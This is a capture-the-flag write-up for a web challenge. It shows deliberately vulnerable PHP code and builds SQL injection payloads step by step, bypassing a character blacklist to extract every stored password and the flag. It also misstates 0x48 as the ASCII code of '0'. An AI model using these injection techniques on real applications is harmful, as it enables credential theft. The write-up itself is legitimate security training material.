# Intigriti Challenge 0923 by Sgrum0x

**Challenge category**: Web<br>
**Challenge description**: "Find the flag on https://challenge-0923.intigriti.io and win Intigriti swag. This is a guest challenge created by @sgrum0x"<br>
**Challenge date**: 25th of September to the 3rd of October, 11:59 PM CET.<br>

## Context

This challenge is about SQL Injection.

## Exploring the challenge
This is the initial page:

![Schermata_Iniziale](https://github.com/H31s3n-b3rg/Private/assets/66698256/fb560c43-66fc-4861-89d7-5481bf8d2545)

By clicking on the source button, the PHP source code will be shown.

```php
<?php

if (isset($_GET['showsource'])) {
    highlight_file(__FILE__);
    exit();
}

require_once("config.php");

$dsn = "mysql:host=$host;dbname=$db;charset=$charset";
$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,
];

try {
    $pdo = new PDO($dsn, $user, $pass, $options);
} catch (PDOException $e) {
    exit("Unable to connect to DB");
}

$max = 10;

if (isset($_GET['max']) && !is_array($_GET['max']) && $_GET['max']>0) {
    $max = $_GET['max'];
    $words  = ["'",""",";","`"," ","a","b","h","k","p","v","x","or","if","case","in","between","join","json","set","=","|","&","%","+","-","<",">","#","/","r","n","t","v","f"]; // list of characters to check
    foreach ($words as $w) {
        if (preg_match("#".preg_quote($w)."#i", $max)) {
            exit("H4ckerzzzz");
        } //no weird chars
    }       
}

try{
//seen in production
$stmt = $pdo->prepare("SELECT id, name, email FROM users WHERE id<=$max");
$stmt->execute();
$results = $stmt->fetchAll();
}
catch(PDOException $e){
    exit("ERROR: BROKEN QUERY");
}
    /* FYI
    CREATE TABLE users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        name VARCHAR(255) NOT NULL,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL
    );
    */
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Utenti</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
</head>
<div class="container mt-5">

    <h2>Users</h2>

    <table class="table table-bordered">
        <thead>
            <tr>
                <th>ID</th>
                <th>Name</th>
                <th>Email</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($results as $row): ?>
                <tr>
                    <td><?= htmlspecialchars(strpos($row['id'],"INTIGRITI")===false?$row['id']:"REDACTED"); ?></td> 
                    <td><?= htmlspecialchars(strpos($row['name'],"INTIGRITI")===false?$row['name']:"REDACTED"); ?></td>
                    <td><?= htmlspecialchars(strpos($row['email'],"INTIGRITI")===false?$row['email']:"REDACTED"); ?></td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>

    <div class="text-center mt-4">
        <!-- Show Source Button -->
        <a href="?showsource=1" class="btn btn-primary">Show Source</a>
    </div>

</div>

<!-- including Bootstrap e jQuery -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

</body>
</html>
```
This PHP page takes the GET <code>max</code> parameter, validates it against a blacklist of dangerous characters and substrings, and unsafely concatenates it into a string that will eventually be executed as a query on a MySQL database.
Two things:
+ <code>max</code> must start with an ASCII character that has an hex code greater than <code>0x48</code> (<code>0</code> in ASCII) (check line 25 in the code above). First character must be a number.
+ If flag is retrived from the database within one of the shown columns (id, name or email) it will be hidden by the <code>REDACTED</code> string (because flag format is INTIGRITI{.*}) (check lines 76-77-78 in the code above).</br>

Let's try to solve the challenge.

## Exploiting the challenge
A lot of important characters are blocked. The most important is the whitespace. [Here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#white-spaces-alternatives "Here") I found an alternative: using parentheses. <code>SELECT 1 FROM Table_Name</code> is the same as <code>SELECT(1)FROM(TABLE_NAME)</code>. Since asterisk char (\*) is not blocked, an initial payload can be the following: <code>1*(1)UNION(SELECT(1),(2),(3))</code>.

![first_injection](https://github.com/H31s3n-b3rg/Private/assets/66698256/de920b0d-4057-4a44-afa6-1f6250425651)


Our injection worked! Now we have to find where the flag is. Accessing INFORMATION_SCHEMA database is almost impossible due to the blacklist. Let's try to check *Password* column. "Password" is not usable, because "p","a" and "or" are blocked. How can a column be accessed without using its name? [This write-up](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/ "This write-up") has the answer! <code>SELECT F.*n* FROM (SELECT 1, 2, 3, ..., *m* UNION SELECT * FROM table_name)F;</code> will allow us to access the nth column of *table_name* without using its name (*m* is equal to the number of columns of *table_name*). *n* is equal 4 in our case, since *Password* is the fourth column of the table. So:</br>
<code>SELECT F.4 FROM (SELECT 1, 2, 3, 4 UNION SELECT * FROM table_name)F;</code></br>
that is:</br>
<code>SELECT(F.4)FROM(SELECT(1),(2),(3),(4)UNION(SELECT\*FROM(users)))F</code></br>
Thus, our payload will be:</br>
<code>1*(1)UNION(SELECT(F.2),(F.3),(F.4)FROM(SELECT(1),(2),(3),(4)UNION(SELECT*FROM(users)))F)</code>

![Passwords_leaked](https://github.com/H31s3n-b3rg/Private/assets/66698256/a3fde13e-80d3-49cb-b06a-2fcea588c1dd)

All passwords are leaked! As expected, the Sgrum0x's password is the flag (since all fields containing the substring "INTIGRITI" are hidden by the string "REDACTED"). To get the flag, we have to retrieve its value without the substring "INTIGRITI". A possible way to do so is to retrieve all passwords without their first char ("I" in the case of Sgrum0x's password). Flag will now contain "NTIGRITI" substring, which avoids the flag being hidden. This could have been done with the SUBSTRING() function, but its name contains a blocked char ("b"). An alternative is the MID() function, which is very similar to SUBSTRING(), but its name doesn't contain any blocked char. So our final payload is:</br>
<code>1*(1)UNION(SELECT(F.2),(MID((F.4),1,1)),(MID((F.4),2,37))FROM(SELECT(1),(2),(3),(4)UNION(SELECT*FROM(users)))F)</code></br>
The flag is split between two columns, but since the first char of the flag is obvious, we could have avoided this splitting and just get the flag from the second character onwards.

![Flag](https://github.com/H31s3n-b3rg/Private/assets/66698256/b2fd5b4f-9049-43b4-a86b-4e0ed3eca34a)

Here's the flag!</br>
Flag is <code>INTIGRITI{bl4ckli5t1ng_1z_n0t_7h3_w4y}</code>.
